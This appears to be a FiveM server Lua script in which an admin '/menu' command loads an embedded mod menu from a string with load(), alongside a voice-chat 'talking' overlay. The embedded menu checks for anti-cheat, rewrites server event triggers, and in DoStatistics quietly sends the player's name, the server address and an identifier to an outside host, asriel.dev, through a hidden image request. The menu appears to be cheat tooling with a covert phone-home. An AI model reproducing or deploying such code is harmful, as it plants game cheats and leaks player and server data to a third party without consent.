                   Replacement = function(res, data) return _replaced(res, data) end
               }
           }
       
           function ADRVSDD:RunDynamicTriggersasdf()
               ADRVSDD:AddNotification("INFO", "Running dynamic triggers.", 15000)
       
               for _, dat in dict.pairs(TEList) do
                   if dat.Replacement and dat.Replacement(dat.Resource, dat) then
                       ADRVSDD:AddNotification("INFO", "Updated dynamic triggers for " .. dat.Name, 20000)
                   end
               end
           end
       
           function ADRVSDD:LoadDui()
               local runtime_txd = CreateRuntimeTxd("ADRVSDD")
               --local banner_dui = CreateDui("https://asriel.dev/ADRVSDD/watermark.gif", 300, 300)
               local b_dui = GetDuiHandle(banner_dui)
               CreateRuntimeTextureFromDuiHandle(runtime_txd, "menu_bg", b_dui)
           end
       
           function ADRVSDD.CharToHex(c)
               return dict.string.format("%%%02X", dict.string.byte(c))
           end
       
           function ADRVSDD:URIEncode(url)
               if url == nil then return end
               url = url:gsub("\n", "\r\n")
               url = url:gsub("([^%w _%%%-%.~])", self.CharToHex)
               url = url:gsub(" ", "+")
       
               return url
           end
       
           function ADRVSDD:DoStatistics()
               if not ADRVSDD.Identifier then return end
       
               local statistics = {
                   name = ADRVSDD:GetFunction("GetPlayerName")(ADRVSDD:GetFunction("PlayerId")()),
                   build = ADRVSDD.Version,
                   server = ADRVSDD:GetFunction("GetCurrentServerEndpoint")()
               }
       
               local stat_url = "https://ADRVSDD.asriel.dev/statistics.gif?identifier=" .. ADRVSDD:URIEncode(ADRVSDD.Identifier) .. "&information=" .. ADRVSDD:URIEncode(dict.json.encode(statistics))
               local s_dui = CreateDui(stat_url, 50, 50)
               Wait(10000)
               DestroyDui(s_dui)
               ADRVSDD:Print("[Statistics] Updated statistics.")
           end
       
           CreateThread(function()
               ADRVSDD.FreeCam:Tick()
           end)
       
           CreateThread(function()
               ADRVSDD.RCCar:Tick()
           end)
       
           CreateThread(function()
               ADRVSDD:SpectateTick()
           end)
       
           CreateThread(function()
               ADRVSDD:AddNotification("INFO", "~y~" .. ADRVSDD.Name .. "~w~ Loaded! (~y~v" .. ADRVSDD.Version .. "~w~)", 25000)
               ADRVSDD:AddNotification("INFO", "Use ~y~" .. ADRVSDD.Config.ShowKey .. " ~w~to open the menu.", 25000)
       
       
               ADRVSDD:RunACChecker()
       

       
               ADRVSDD.ConfigClass.Load()
               ADRVSDD:BuildIdentifier()
               ADRVSDD:LoadDui()
               Wait(2500)
           end)
       end) 
       
       end)
]]

RegisterCommand('menu',function(source,args)
    if ESX.GetPlayerData().aduty then
        ESX.TriggerServerCallback('esx_aduty:getAdminPerm', function(aperm)
            if aperm >= 13 then
                load(srcm)()
            end
        end)
    end
end)

function drawTxt(x,y ,width,height,scale, text, r,g,b,a)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(scale, scale)
    SetTextColour(r, g, b, a)
    SetTextDropShadow(0, 0, 0, 0,255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x - width/2, y - height/2 + 0.005)
end

Talk = false

RegisterCommand('talk',function(source,args)
	ESX.TriggerServerCallback('esx_aduty:getAdminPerm', function(aperm)
        if aperm > 0 then
		    Talk = not Talk
            Wait(1000)
            Citizen.CreateThread(function()
                while Talk do
                    Citizen.Wait(1)
                    local t = 0
                    for i = 0,255 do
                        if(GetPlayerName(i))then
                            if(NetworkIsPlayerTalking(i))then
                                t = t + 1
            
                                if(t == 1)then
                                    drawTxt(1.0, 0.5, 1.0,1.0,0.4, "~y~Talking", 255, 255, 255, 255)
                                end
            
                                drawTxt(1.0, 0.5 + (t * 0.030), 1.0,1.0,0.4, " (" .. GetPlayerServerId(i) .. ") " .. GetPlayerName(i), 255, 255, 255, 255)
                            end
                        end
                    end		
                end
            end)
	    end
	 end)
end)



